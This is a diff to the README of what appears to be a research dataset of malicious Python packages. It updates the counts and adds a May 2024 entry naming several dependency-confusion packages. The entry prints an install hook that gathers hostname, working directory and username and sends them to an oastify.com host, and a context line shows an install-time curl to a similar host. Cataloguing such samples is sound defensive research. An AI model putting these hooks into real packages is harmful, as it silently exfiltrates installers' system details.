@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 5,902 versions of the source code of 5,176 malicious packages.
+This data set includes about 5,907 versions of the source code of 5,180 malicious packages.
 
 ## Dataset Format
 
@@ -316,6 +316,27 @@ blypack [0.1, 0.2, 0.3, 0.4, 0.5]
 def post_install():
     os.system('curl https://kymslgsrz9xelqdvm7uxogrrnit9ha5z.oastify.com/test')
 ```
+
+### 22 May. 2024 
+reallydonothing [0.1, 0.2]
+
+ml_linear_regression_lib [1.1.3]
+
+dependency_confusion123456 [9.9.9]
+
+dependency_confusion123 [1.0.4]
+
+```python
+class CustomInstall(install):
+    def run(self):
+        install.run(self)
+        hostname=socket.gethostname()
+        cwd = os.getcwd()
+        username = getpass.getuser()
+        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
+        requests.get("https://u3ynvyf8desx9vy4a91eslj4rvxmld92.oastify.com",params = ploads)
+```
+
 
 ## About the malicious packages detection
 
